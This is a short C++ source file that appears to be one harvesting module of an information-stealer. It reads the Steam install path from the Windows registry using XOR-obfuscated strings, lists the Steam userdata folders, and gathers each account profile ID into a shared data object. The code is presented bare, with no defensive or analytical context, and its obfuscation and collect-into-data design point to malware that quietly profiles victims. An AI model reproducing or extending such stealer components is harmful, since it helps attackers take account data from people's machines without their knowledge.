
#include "module.h"

DEFINE_MODULE(Steam,
	{
		HKEY hKey;

		if (RegOpenKeyEx(HKEY_CURRENT_USER, XOR("Software\\Valve\\Steam"), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
			CHAR buffer[MAX_PATH];
			DWORD bufferSize = sizeof(buffer);

			if (RegQueryValueEx(hKey, XOR("SteamPath"), 0, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
				std::filesystem::path steam_path = buffer;

				for (const auto& dirEntry : std::filesystem::directory_iterator(steam_path / "userdata")) {

					auto sid = dirEntry.path().filename();

					data["profiles"].push_back(sid);
				}
			}

			RegCloseKey(hKey);
		}
	}
)